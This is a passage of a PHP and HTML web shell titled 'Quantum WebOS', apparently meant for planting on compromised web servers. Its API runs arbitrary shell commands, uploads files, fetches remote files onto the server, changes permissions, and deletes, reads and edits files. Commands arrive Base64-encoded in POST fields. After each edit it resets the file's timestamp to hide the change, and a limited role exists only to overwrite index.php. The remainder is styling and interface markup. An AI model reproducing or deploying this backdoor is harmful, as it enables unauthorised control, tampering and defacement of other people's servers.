        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false) return $data;
    }
    if (ini_get('allow_url_fopen')) {
        $opts = ['http' => ['timeout' => 30, 'header' => "User-Agent: Mozilla/5.0\r\n"]];
        $context = stream_context_create($opts);
        return @file_get_contents($url, false, $context);
    }
    return false;
}

function getSafePath($base, $req) {
    if (empty($req)) return $base;
    $target = realpath($req);
    if ($target === false) { $target = realpath($base . '/' . $req); }
    return $target !== false ? $target : $base;
}

function formatBytes($bytes) {
    if ($bytes == 0) return '0 B';
    $u = ['B','KB','MB','GB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 1) . ' ' . $u[$i];
}

// BASE64 POST DECODER
function get_post($key) { return isset($_POST[$key]) ? base64_decode($_POST[$key]) : ''; }

if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    // GET untuk fungsi list & read, sisanya via POST Base64
    $action = $_GET['action'] ?? get_post('action');
    $path_req = $_GET['path'] ?? get_post('path');
    $current_dir = getSafePath($base_dir, $path_req);

    // === RULES FOR PACMAN ROLE ===
    if ($user_role === 'pacman') {
        $current_dir = $base_dir; // RULE 1: Kunci akses HANYA di root domain
        
        $allowed_actions = ['list', 'read', 'upload_b64', 'edit', 'touch'];
        if (!in_array($action, $allowed_actions)) {
            echo custom_json_encode(['status' => 'error', 'msg' => 'ERROR !']);
            exit;
        }
        
        if (in_array($action, ['upload_b64', 'edit', 'touch', 'read'])) {
            $fname = '';
            if ($action === 'upload_b64') $fname = get_post('filename');
            elseif ($action === 'edit') $fname = get_post('target');
            elseif ($action === 'touch') $fname = get_post('name') ?: 'new_file.txt';
            elseif ($action === 'read') $fname = $_GET['target'];
            
            // RULE 2: Validasi exact match ke "index.php" saja
            if (basename($fname) !== 'index.php') {
                echo custom_json_encode(['status' => 'error', 'msg' => 'ERROR !']);
                exit;
            }
        }
    }
    // =============================

    try {
        if ($action === 'list') {
            // (Kode Anda selanjutnya tetap sama)
            $files = scandir($current_dir);
            $data = ['path' => $current_dir, 'items' => []];
            foreach ($files as $f) {
                if ($f === '.' || ($f === '..' && $current_dir === DIRECTORY_SEPARATOR)) continue;
                $full = $current_dir . '/' . $f;
                $is_dir = is_dir($full);
                $stat = @stat($full);
                
                $data['items'][] = [
                    'name' => $f,
                    'type' => $is_dir ? 'dir' : 'file',
                    'ext' => $is_dir ? '' : strtolower(pathinfo($full, PATHINFO_EXTENSION)),
                    'size' => $is_dir ? 'Folder' : formatBytes($stat['size']),
                    'perms' => substr(sprintf('%o', @fileperms($full)), -4),
                    'permit' => is_readable($full),
                    'mtime' => date('d M Y, H:i', $stat['mtime'])
                ];
            }
            usort($data['items'], function($a, $b) {
                if ($a['name'] === '..') return -1;
                if ($b['name'] === '..') return 1;
                if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
                return strcasecmp($a['name'], $b['name']);
            });
            echo custom_json_encode(['status' => 'ok', 'data' => $data]);
            
        } elseif ($action === 'cmd') {
            $cmd = get_post('cmd');
            $out = execute_cmd($cmd);
            echo custom_json_encode(['status' => 'ok', 'output' => $out ?: "Command executed successfully."]);
            
        } elseif ($action === 'mkdir') {
            $name = preg_replace('/[^a-zA-Z0-9_-]/', '', get_post('name') ?: 'new_folder');
            if (@mkdir($current_dir . '/' . $name, 0755)) echo custom_json_encode(['status' => 'ok']);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Failed to create folder']);
            
        } elseif ($action === 'touch') {
            $name = preg_replace('/[^a-zA-Z0-9_.-]/', '', get_post('name') ?: 'new_file.txt');
            if (@touch($current_dir . '/' . $name)) echo custom_json_encode(['status' => 'ok']);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Failed to create file']);

        } elseif ($action === 'delete') {
            $target = $current_dir . '/' . get_post('target');
            if (file_exists($target)) {
                is_dir($target) ? @rmdir($target) : @unlink($target);
                echo custom_json_encode(['status' => 'ok']);
            } else { echo custom_json_encode(['status' => 'error', 'msg' => 'Target not found']); }
            
        } elseif ($action === 'rename') {
            $target = $current_dir . '/' . get_post('target');
            $new_name = $current_dir . '/' . preg_replace('/[^a-zA-Z0-9_.-]/', '', get_post('new_name'));
            if (file_exists($target) && @rename($target, $new_name)) echo custom_json_encode(['status' => 'ok']);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Failed to rename']);
            
        } elseif ($action === 'upload_b64') {
            $filename = basename(get_post('filename'));
            $file_data = isset($_POST['file_data']) ? base64_decode($_POST['file_data']) : ''; // Decode isi file yang di base64 kan JS
            $target = $current_dir . '/' . $filename;
            if (write_file($target, $file_data)) echo custom_json_encode(['status' => 'ok']);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Upload failed (Permission Denied)']);

        } elseif ($action === 'download_url') {
            $url = get_post('url');
            if (empty($url)) { echo custom_json_encode(['status' => 'error', 'msg' => 'No URL provided']); exit; }
            $filename = basename(parse_url($url, PHP_URL_PATH));
            if (empty($filename) || $filename === '/') $filename = 'downloaded_' . time();
            
            $content = fetch_url($url);
            if ($content !== false) {
                $savePath = $current_dir . '/' . $filename;
                if (write_file($savePath, $content)) echo custom_json_encode(['status' => 'ok', 'filename' => $filename]);
                else echo custom_json_encode(['status' => 'error', 'msg' => 'Failed to save file locally']);
            } else { echo custom_json_encode(['status' => 'error', 'msg' => 'Failed to fetch from URL via cURL/fgc']); }
            
        } elseif ($action === 'chmod') {
            $target = $current_dir . '/' . get_post('target');
            $perms = octdec(get_post('perms'));
            if (file_exists($target) && @chmod($target, $perms)) echo custom_json_encode(['status' => 'ok']);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Chmod failed']);

        } elseif ($action === 'read') {
            $target = $current_dir . '/' . $_GET['target'];
            if (is_file($target)) echo custom_json_encode(['status' => 'ok', 'content' => file_get_contents($target)]);
            else echo custom_json_encode(['status' => 'error', 'msg' => 'Read failed']);

        } elseif ($action === 'edit') {
            $target = $current_dir . '/' . get_post('target');
            if (is_file($target)) {
                $old_mtime = filemtime($target); 
                $content = get_post('content');
                if (write_file($target, $content)) {
                    touch($target, $old_mtime);
                    echo custom_json_encode(['status' => 'ok']);
                } else { echo custom_json_encode(['status' => 'error', 'msg' => 'Save failed']); }
            }
        }
    } catch (Exception $e) { echo custom_json_encode(['status' => 'error', 'msg' => $e->getMessage()]); }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Quantum WebOS</title>
    
    <script src="https://unpkg.com/gsap@3/dist/gsap.min.js"></script>
    <script src="https://assets.codepen.io/16327/MorphSVGPlugin3.min.js"></script>

    <style>
        :root {
            --os-bg: #0b0c10; --win-bg: rgba(22, 24, 28, 0.95);
            --win-border: rgba(255, 255, 255, 0.1); --title-bg: rgba(10, 10, 12, 0.9);
            --text-main: #c5c6c7; --text-muted: #888;
            --accent: #66fcf1; --accent-dim: #45a29e; 
            --danger: #ff4081; --success: #00e676;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', -apple-system, sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
        
        body, html { background-color: #000000; }
        body { background-image: radial-gradient(circle at center, #1f2833 0%, #0b0c10 100%); color: var(--text-main); height: 100dvh; overflow: hidden; }
        #desktop { position: relative; width: 100vw; height: 100dvh; overflow: hidden; }

        .tb-btn { background: rgba(255,255,255,0.05); border: 1px solid var(--win-border); color: var(--text-main); padding: 8px 15px; border-radius: 6px; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; font-weight: 600; }
        .tb-btn:hover { background: var(--accent-dim); color: #000; border-color: var(--accent); }

        .tb-btn.btn-save:hover { background: var(--danger); color: #fff; border-color: var(--danger); }

        .window {
            position: absolute; top: 50px; left: 50px; width: 650px; height: 450px;
            background: var(--win-bg); border: 1px solid var(--win-border); border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6); display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(20px);
        }

        .window:not(.float-term) { 
            width: 100% !important; height: 100% !important; 
            top: 0 !important; left: 0 !important; 
            border-radius: 0 !important; border: none !important;
        }

        @media (max-width: 768px) { 
            .float-term { width: 90% !important; height: 60% !important; top: 15% !important; left: 5% !important; border-radius: 12px !important; box-shadow: 0 20px 50px rgba(0,0,0,0.9); }
            .dl-loader { max-width: 260px !important; }
        }

        .win-titlebar { height: 42px; background: var(--title-bg); display: flex; justify-content: space-between; align-items: center; padding: 0 10px; cursor: grab; border-bottom: 1px solid var(--win-border); flex-shrink: 0; }
        .win-titlebar:active { cursor: grabbing; }
        .win-title { font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 8px; }
        .win-controls { display: flex; gap: 6px; align-items: center; }
        .win-btn { width: 14px; height: 14px; border-radius: 50%; border: none; cursor: pointer; }
        .w-close { background: #ff5f56; } .w-max { background: #ffbd2e; }

        .win-home-btn, .win-hamburger-btn {
            display: none !important; width: 32px; height: 32px;
            background: rgba(255,255,255,0.07); border: 1px solid var(--win-border); border-radius: 7px;
            cursor: pointer; align-items: center; justify-content: center; transition: background 0.2s; flex-shrink: 0;
        }
        .win-home-btn:hover, .win-hamburger-btn:hover { background: rgba(255,255,255,0.16); }
        .win-home-btn svg { width: 16px; height: 16px; stroke: var(--text-main); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; pointer-events: none; }

        .win-hamburger-btn { position: relative; }
        .win-hamburger-btn .hb-line {
            display: block; position: absolute; width: 16px; height: 2px;
            background: var(--text-main); border-radius: 2px; left: 50%; transform: translateX(-50%);
            transition: top 0.28s cubic-bezier(0.23, 1, 0.32, 1), transform 0.28s cubic-bezier(0.23, 1, 0.32, 1), opacity 0.18s ease;
        }
        .win-hamburger-btn .hb-line:nth-child(1) { top: 9px; }
        .win-hamburger-btn .hb-line:nth-child(2) { top: 15px; }
        .win-hamburger-btn .hb-line:nth-child(3) { top: 21px; }
        .win-hamburger-btn.is-open .hb-line:nth-child(1) { top: 15px; transform: translateX(-50%) rotate(45deg); }
        .win-hamburger-btn.is-open .hb-line:nth-child(2) { opacity: 0; transform: translateX(-50%) scaleX(0); }
        .win-hamburger-btn.is-open .hb-line:nth-child(3) { top: 15px; transform: translateX(-50%) rotate(-45deg); }

        .window:not(.float-term) .win-btn.w-close, 
        .window:not(.float-term) .win-btn.w-max { display: none !important; }
        .window:not(.float-term) .win-home-btn, 
        .window:not(.float-term) .win-hamburger-btn { display: inline-flex !important; }

        @media (max-width: 768px) {
            .float-term .win-btn.w-close, .float-term .win-btn.w-max { display: none; }
        }

        .win-content { flex: 1; overflow: hidden; position: relative; background: rgba(0,0,0,0.2); display: flex; flex-direction: column; }

        .explorer-header { padding: 12px; border-bottom: 1px solid var(--win-border); display: flex; flex-direction: column; gap: 10px; background: rgba(0,0,0,0.4); flex-shrink: 0; }
        .breadcrumb-bar { display: flex; gap: 4px; padding: 8px 10px; background: rgba(0,0,0,0.3); border: 1px solid var(--win-border); border-radius: 6px; font-family: monospace; font-size: 13px; align-items: center; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
        .breadcrumb-bar::-webkit-scrollbar { display: none; }
        .crumb { color: var(--text-main); cursor: pointer; padding: 4px 8px; border-radius: 4px; transition: 0.2s; display: inline-flex; align-items: center; background: rgba(255,255,255,0.03); border: 1px solid transparent; }
        .crumb:hover { background: rgba(255,255,255,0.1); color: #fff; border-color: rgba(255,255,255,0.2); }
        .crumb-sep { color: var(--text-muted); pointer-events: none; font-weight: bold; margin: 0 2px; }
        
        .glitch-title {
            position: relative; display: inline-block; font-size: 13px; font-weight: 700; color: #fff;
            letter-spacing: 2px; text-transform: uppercase; animation: glitch-skew 1s infinite linear alternate-reverse;
        }
        .glitch-title::before, .glitch-title::after {
            content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.8;
        }
        .glitch-title::before { color: var(--accent); z-index: -1; clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%); transform: translate(-2px, -1px); animation: glitch-anim 2s infinite linear alternate-reverse; }
        .glitch-title::after { color: var(--danger); z-index: -2; clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%); transform: translate(2px, 1px); animation: glitch-anim2 2.5s infinite linear alternate-reverse; }
        
        @keyframes glitch-anim { 0% { transform: translate(-2px, -1px); } 20% { transform: translate(2px, 1px); } 40% { transform: translate(-2px, 2px); } 60% { transform: translate(2px, -1px); } 80% { transform: translate(-2px, -2px); } 100% { transform: translate(0); } }
        @keyframes glitch-anim2 { 0% { transform: translate(2px, 1px); } 20% { transform: translate(-2px, -1px); } 40% { transform: translate(2px, 2px); } 60% { transform: translate(-2px, -1px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
        
        .slider {
            --slider-percentage: 0%; --slider-thumb-size: 20px; --slider-label-opacity: 0; --slider-label-scale: .5; --slider-label-y: 0;
            position: relative; max-width: 100%; width: 100%; user-select: none; grid-gap: 15px; display: grid; align-items: center; grid-template-columns: 24px auto 24px; padding: 0 5px; margin-top: 5px;
        }
        .slider.isDragging { --slider-label-opacity: 1; --slider-label-scale: 1; --slider-label-y: -4px; }
        .slider svg { display: block; fill: none; stroke: var(--text-muted); overflow: visible; width: 24px; height: 24px; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
        .slider svg path { transition: stroke 0.3s; }
        .slider .slider-inner { position: relative; width: 100%; }
        .slider .slider-inner:before { content: ""; height: 6px; border-radius: 3px; position: absolute; left: 0; top: 9px; right: 0; pointer-events: none; border-radius: 6px; background-image: linear-gradient(to right, var(--danger), var(--success)); background-repeat: no-repeat; clip-path: inset(-1px var(--slider-percentage) -1px -1px); }
        .slider .slider-inner input { -webkit-appearance: none; appearance: none; width: 100%; height: 6px; background-color: rgba(255,255,255,0.1); outline: none; border-radius: 3px; }
        .slider .slider-inner input::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: var(--slider-thumb-size); height: var(--slider-thumb-size); margin: calc(var(--slider-thumb-size) * -.5 + 10px) 0 0 0; z-index: 1; position: relative; border-radius: 50%; background-image: linear-gradient(180deg, #B6B6B6 0%, #FBFBFB 100%); box-shadow: 0px 0.5px 0px 0px #FFF inset, 0px -0.5px 0px 0px #BBB inset; cursor: pointer; }
        .slider .slider-label { position: absolute; bottom: 125%; left: 0; pointer-events: none; }
        .slider .slider-label div { background-color: var(--text-main); color: #000; padding: 4px 8px; border-radius: 5px; font-size: 13px; font-weight:bold; font-family: monospace; white-space: nowrap; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.5)); opacity: var(--slider-label-opacity); transform: translateY(var(--slider-label-y)) scale(var(--slider-label-scale)) translateZ(0); transform-origin: 50% 75%; transition: transform 0.3s, opacity 0.2s; }
        
        #fs-view { flex: 1; overflow-y: auto; padding-bottom: 20px; scroll-behavior: auto; }
        
        .dl-loader { width: 100%; max-width: 450px; position: relative; display: block; padding: 0 15px; }
        .dl-loader svg { width: 100%; height: auto; display: block; }
        #progress-time-fill { animation: progress-fill 3s linear infinite; }
        #death-group { animation: walk 3s ease infinite; transform: translateX(0); }
        #death-arm { animation: move-arm 3s ease infinite; transform-origin: -60px 74px; }
        #death-tool { animation: move-tool 3s ease infinite; transform-origin: -48px center; }
        #designer-arm-grop { animation: write 0.8s ease infinite; transform-origin: 90% top; }
        #red-flame { opacity: 0; animation: show-flames 3s ease infinite, red-flame 120ms ease infinite; transform-origin: center bottom; }
        #yellow-flame { opacity: 0; animation: show-flames 3s ease infinite, yellow-flame 120ms ease infinite; transform-origin: center bottom; }
        #white-flame { opacity: 0; animation: show-flames 3s ease infinite, red-flame 100ms ease infinite; transform-origin: center bottom; }
        
        .dl-text { color: #fff; text-align: center; width: 100px; margin: 10px auto 0; position: relative; height: 20px; font-family: 'Consolas', monospace; font-size: 13px; font-weight: bold; letter-spacing: 1px; }
        .dl-text .inner { width: 100px; position: relative; top: 0; left: 0; }
        .dl-mask-red, .dl-mask-white { position: absolute; top: 0; width: 100%; overflow: hidden; height: 100%; }
        .dl-mask-red { left: 0; width: 0; color: #BE002A; animation: text-red 3s ease infinite; z-index: 2; background: var(--os-bg); }
        .dl-mask-white { right: 0; }

        @keyframes progress-fill { 0% { x: -100%; } 100% { x: -3%; } }
        @keyframes walk { 0%, 6% { transform: translateX(0); } 10% { transform: translateX(100px); } 15% { transform: translateX(140px); } 25% { transform: translateX(170px); } 35% { transform: translateX(220px); } 45% { transform: translateX(280px); } 55% { transform: translateX(340px); } 65% { transform: translateX(370px); } 75% { transform: translateX(430px); } 85% { transform: translateX(460px); } 100% { transform: translateX(520px); } }
        @keyframes move-arm { 0%, 5%, 80% { transform: rotate(0); } 9% { transform: rotate(40deg); } }
        @keyframes move-tool { 0%, 5%, 80% { transform: rotate(0); } 9% { transform: rotate(50deg); } }
        @keyframes write { 0%, 32%, 65% { transform: translate(0, 0) rotate(0deg) scale(1, 1); } 16% { transform: translate(0px, 0px) rotate(5deg) scale(0.8, 1); } 48% { transform: translate(0px, 0px) rotate(6deg) scale(0.8, 1); } 83% { transform: translate(0px, 0px) rotate(4deg) scale(0.8, 1); } }
        @keyframes text-red { 0% { width: 0%; } 100% { width: 98%; } }
        @keyframes show-flames { 0%, 74%, 100% { opacity: 0; } 80%, 99% { opacity: 1; } }
        @keyframes red-flame { 0%, 100% { transform: translateY(-30px) scale(1, 1); } 25% { transform: translateY(-30px) scale(1.1, 1.1); } 75% { transform: translateY(-30px) scale(0.8, 0.7); } }
        @keyframes yellow-flame { 0%, 100% { transform: translateY(-30px) scale(0.8, 0.7); } 50% { transform: translateY(-30px) scale(1.1, 1.2); } }
        
        .list-row { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 10px; padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.03); cursor: pointer; transition: background 0.1s; -webkit-touch-callout: none; -webkit-user-select: none; }
        .list-row:hover { background: rgba(255,255,255,0.06); }
        .list-row:active { background: rgba(102, 252, 241, 0.1); }
        
        .f-main { display: flex; align-items: center; gap: 8px; overflow: hidden; flex: 1; min-width: 0; pointer-events: none; }
        .f-icon { width: 32px; height: 32px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.2); border-radius: 8px; border: 1px solid var(--win-border); }
        .f-icon svg { width: 18px; height: 18px; stroke: var(--text-main); stroke-width: 1.5; fill: none; }
        .list-row.dir .f-icon { background: rgba(227, 192, 89, 0.1); border-color: rgba(227, 192, 89, 0.3); }
        .list-row.dir .f-icon svg { stroke: #e3c059; fill: rgba(227, 192, 89, 0.2); }
        
        .f-info { display: flex; flex-direction: column; gap: 4px; overflow: hidden; }
        .f-name { font-size: 14px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .f-meta { display: flex; align-items: center; gap: 10px; font-size: 11px; color: var(--text-muted); font-family: monospace; }
        .f-meta span.dot { width: 4px; height: 4px; background: var(--win-border); border-radius: 50%; }
        
        .row-actions { display: flex; gap: 6px; flex-shrink: 0; overflow-x: auto; scrollbar-width: none; align-items: center; position: relative; z-index: 2; }
        .row-actions::-webkit-scrollbar { display: none; }
        
        .act-btn { 
            background: rgba(255, 255, 255, 0.02); /* Hitbox fix */
            border: 1px solid var(--win-border); 
            color: var(--text-main); 
            padding: 5px 8px; /* Ukuran padding 13.13 */
            border-radius: 6px; 
            cursor: pointer; 
            transition: all 0.2s; 
            display: inline-flex; 
            align-items: center; 
            justify-content: center; 
            flex-shrink: 0; 
            position: relative; 
            -webkit-tap-highlight-color: transparent;
        }
        
        .act-btn:hover, .act-btn:active { background: var(--accent-dim); color: #000; border-color: var(--accent); }
        
        /* Ukuran SVG 13.13 + cegah block klik */
        .act-btn svg { pointer-events: none !important; width: 16px; height: 16px; }

        /* Popup Context Menu CSS */
        .context-menu {
            position: fixed; background: rgba(20, 22, 26, 0.98); backdrop-filter: blur(15px);
            border: 1px solid var(--win-border); border-radius: 12px; padding: 6px; z-index: 100000;
            box-shadow: 0 15px 40px rgba(0,0,0,0.8); display: flex; flex-direction: column; min-width: 170px;
        }
        .ctx-item { padding: 12px 16px; font-size: 14px; font-weight: 500; color: var(--text-main); cursor: pointer; border-radius: 8px; transition: 0.2s; display: flex; align-items: center; gap: 12px; }
        .ctx-item:hover, .ctx-item:active { background: rgba(255,255,255,0.08); color: #fff; }
        .ctx-item svg { width: 16px; height: 16px; stroke-width: 2; flex-shrink: 0; pointer-events: none !important; }
        .ctx-item.danger { color: var(--danger); }
        .ctx-item.danger:hover, .ctx-item.danger:active { background: rgba(255, 64, 129, 0.15); }

        /* === MOBILE RESPONSIVE TWEAKS === */
        @media (max-width: 768px) {
            .list-row { padding: 10px 10px; gap: 5px; } /* Ukuran 13.13 */
            .f-name { font-size: 14px; }
            .f-meta { font-size: 12px; gap: 6px; }
            .act-btn { padding: 4px 6px; } /* Ukuran 13.13 */
            .act-btn svg { width: 14px; height: 14px; }
            .row-actions { gap: 4px; }
        }

        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 999999; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
        @media (max-width: 768px) { #toast-container { top: auto; bottom: 80px; left: 50%; transform: translateX(-50%); width: 90%; align-items: center; } }
        
        .sys-toast { 
            background: rgba(20, 22, 26, 0.95); backdrop-filter: blur(10px);
            border-left: 4px solid var(--success); color: #fff; padding: 14px 20px;
            border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            font-size: 13px; font-weight: 500; pointer-events: auto;
            animation: toastIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            display: flex; align-items: center; gap: 12px;
        }
        .sys-toast.error { border-left-color: var(--danger); }
        @keyframes toastIn { from { opacity: 0; transform: translateY(-20px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }

        .editor-layout { display: flex; flex-direction: column; height: 100%; background: #1e1e1e; }
        .editor-toolbar { padding: 8px 12px; background: rgba(0,0,0,0.6); display: flex; justify-content: flex-end; border-bottom: 1px solid var(--win-border); }
        .editor-textarea { flex: 1; background: transparent; color: #d4d4d4; font-family: 'Consolas', monospace; font-size: 14px; border: none; padding: 12px; outline: none; resize: pre; white-space: pre; user-select: text; }

        .terminal-output { padding: 10px; font-family: 'Consolas', monospace; font-size: 13px; color: #0f0; white-space: pre-wrap; height: calc(100% - 35px); overflow-y: auto; user-select: text; }
        .terminal-input-line { display: flex; padding: 0 10px 10px; font-family: 'Consolas', monospace; }
        .terminal-input-line span { color: var(--accent); margin-right: 8px; }
        .terminal-input { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-family: inherit; font-size: 13px; }

        #os-dialog-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); z-index: 99999; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: 0.2s; }
        #os-dialog-layer.active { opacity: 1; pointer-events: auto; }
        .os-dialog { background: var(--title-bg); border: 1px solid var(--win-border); width: 320px; border-radius: 12px; padding: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); transform: scale(0.9); transition: 0.2s; }
        #os-dialog-layer.active .os-dialog { transform: scale(1); }
        
        .os-d-title { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: var(--danger); }
        .os-d-input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid var(--win-border); color: #fff; padding: 10px; border-radius: 6px; font-size: 14px; outline: none; margin-bottom: 20px; user-select: text; }
        .os-d-input:focus { border-color: var(--danger); }
        .os-d-actions { display: flex; gap: 10px; justify-content: flex-end; }
        .os-btn { padding: 8px 16px; border-radius: 6px; border: none; font-size: 13px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .os-btn.cancel { background: transparent; color: var(--text-muted); }
        .os-btn.cancel:hover { background: rgba(255,255,255,0.05); color: #fff; }
        .os-btn.confirm { background: var(--danger); color: #fff; }
        .os-btn.confirm:hover { filter: brightness(1.2); }

        .card-holder { position: fixed; right: 0; top: 50%; transform: translateY(-50%); z-index: 99990; display: flex; flex-direction: column; gap: 7px; pointer-events: none; }
        .card-wrapper { display: flex; justify-content: flex-end; pointer-events: none; }
        .card-slide {
            position: relative; display: flex; align-items: center; gap: 9px; padding: 11px 16px 11px 14px;
            border-radius: 9px 0 0 9px; cursor: pointer; transform: translateX(calc(100% - 8px));
            transition: transform 0.28s ease-in-out, box-shadow 0.28s; box-shadow: -4px 0 14px rgba(0,0,0,0.55);
            white-space: nowrap; user-select: none; -webkit-tap-highlight-color: transparent; pointer-events: auto;
        }
        .card-slide:hover, .card-slide:active { transform: translateX(0); box-shadow: -8px 0 24px rgba(0,0,0,0.75); }
        .card-slide svg { width: 15px; height: 15px; stroke: rgba(255,255,255,0.92); fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
        .card-label { font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: rgba(255,255,255,0.93); }
        .card-upload   { background: linear-gradient(135deg, #0e3650 0%, #2e7fb5 100%); }
        .card-cmd      { background: linear-gradient(135deg, #251050 0%, #6a42b5 100%); }
        .card-download { background: linear-gradient(135deg, #0e4820 0%, #3aab5e 100%); }
        .card-item4    { background: linear-gradient(135deg, #5a4a1a 0%, #c49a3a 100%); }
        .card-item5    { background: linear-gradient(135deg, #4a1520 0%, #b54060 100%); }
        .card-item6    { background: linear-gradient(135deg, #4a2a0a 0%, #c47030 100%); }

        .card-holder.mobile-open .card-wrapper:nth-child(1) .card-slide { transition-delay: 0ms; }
        .card-holder.mobile-open .card-wrapper:nth-child(2) .card-slide { transition-delay: 35ms; }
        .card-holder.mobile-open .card-wrapper:nth-child(3) .card-slide { transition-delay: 70ms; }
        .card-holder.mobile-open .card-wrapper:nth-child(4) .card-slide { transition-delay: 105ms; }
        .card-holder.mobile-open .card-wrapper:nth-child(5) .card-slide { transition-delay: 140ms; }
        .card-holder.mobile-open .card-wrapper:nth-child(6) .card-slide { transition-delay: 175ms; }
        .card-holder.mobile-open .card-slide { transform: translateX(0) !important; box-shadow: -5px 0 18px rgba(0,0,0,0.8); }

        #card-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.55); backdrop-filter: blur(3px); z-index: 99980; }
        #card-overlay.active { display: block; }

        @media (max-width: 768px) {
            .card-holder { gap: 6px; pointer-events: none; }
            .card-wrapper { pointer-events: none; }
            .card-slide { padding: 10px 13px 10px 11px; gap: 7px; border-radius: 9px 0 0 9px; transform: translateX(100%); transition: transform 0.32s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.28s; }
            .card-slide svg { width: 13px; height: 13px; }
            .card-label { font-size: 10px; letter-spacing: 1.3px; }
        }
    </style>
</head>
<body>

    <div id="desktop">
        <form id="sys-upload-form" style="display:none;">
            <input type="file" id="sys-upload" onchange="apiUpload(this.files[0])">
        </form>
    </div>

    <div id="toast-container"></div>
    <div id="card-overlay" onclick="closeCardMenu()"></div>

    <div class="card-holder" id="card-holder">
        <div class="card-wrapper"><div class="card-slide card-upload" onclick="cardAction('upload')" title="Upload"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg><span class="card-label">Upload</span></div></div>
        <div class="card-wrapper"><div class="card-slide card-cmd" onclick="cardAction('cmd')" title="Terminal"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg><span class="card-label">CMD</span></div></div>
        <div class="card-wrapper"><div class="card-slide card-download" onclick="cardAction('download')" title="Download from URL"><svg viewBox="0 0 24 24"><polyline points="8 17 12 21 16 17"></polyline><line x1="12" y1="12" x2="12" y2="21"></line><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"></path></svg><span class="card-label">Download</span></div></div>
        <div class="card-wrapper"><div class="card-slide card-item4" onclick="cardAction('item4')" title="Permissions"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg><span class="card-label">Chmod</span></div></div>
        <div class="card-wrapper"><div class="card-slide card-item5" onclick="cardAction('item5')" title="New Folder"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path><line x1="12" y1="11" x2="12" y2="17"></line><line x1="9" y1="14" x2="15" y2="14"></line></svg><span class="card-label">Mkdir</span></div></div>
        <div class="card-wrapper"><div class="card-slide card-item6" onclick="cardAction('item6')" title="New File"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="11" x2="12" y2="17"></line><line x1="9" y1="14" x2="15" y2="14"></line></svg><span class="card-label">Touch</span></div></div>
    </div>

    <div id="os-dialog-layer">
        <div class="os-dialog">
            <div class="os-d-title" id="os-d-title">Title</div>
            <input type="text" class="os-d-input" id="os-d-input">
            <div class="os-d-actions">
                <button class="os-btn cancel" onclick="closeOsDialog()">Cancel</button>
